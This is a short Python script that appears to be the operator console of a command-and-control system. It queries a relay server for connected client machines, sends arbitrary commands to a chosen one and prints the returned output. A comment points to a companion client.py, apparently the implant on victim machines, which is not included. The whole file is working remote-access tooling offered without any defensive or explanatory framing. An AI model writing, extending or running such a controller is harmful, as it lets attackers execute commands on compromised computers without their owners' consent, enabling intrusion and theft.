import requests
import time

SERVER_URL = "http://example.com/url.txt" # SAME URL AS THE ONE IN CLIENT.PY SCRIPT

def get_clients():
    response = requests.get(f"{SERVER_URL}/get_clients")
    try:
        data = response.json()
        print("[DEBUG] Server response:", data)
        if isinstance(data, dict):
            return data.get("clients", [])
        else:
            print("[ERROR] Unexpected response format. Expected a dictionary.")
            return []
    except Exception as e:
        print(f"[ERROR] Failed to parse JSON: {e}")
        return []
def send_command(client_id, command):
    response = requests.post(f"{SERVER_URL}/send_command/{client_id}", json={"command": command})
    return response.status_code == 200
def get_command_output(client_id):
    output_url = f"{SERVER_URL}/client_data/{client_id}/output.json"
    while True:
        response = requests.get(output_url)
        if response.status_code == 200:
            data = response.json()
            print(f"\n[+] Output from {client_id}:\n{data['output']}")
            requests.post(f"{SERVER_URL}/clear_command/{client_id}")
            break
        time.sleep(2)

def main():
    while True:
        clients = get_clients()
        if not clients:
            print("[!] No clients connected.")
        else:
            print("\nConnected Clients:")
            for i, client in enumerate(clients):
                print(f"{i + 1}. {client}")
        
        choice = input("\nEnter client number to interact with (or 'q' to quit): ")
        if choice.lower() == 'q':
            break
        
        try:
            client_id = clients[int(choice) - 1]
        except (IndexError, ValueError):
            print("[!] Invalid selection.")
            continue

        command = input(f"Enter command for {client_id}: ")
        if send_command(client_id, command):
            print("[+] Command sent. Waiting for output...")
            get_command_output(client_id)
        else:
            print("[!] Failed to send command.")

if __name__ == "__main__":
    main()
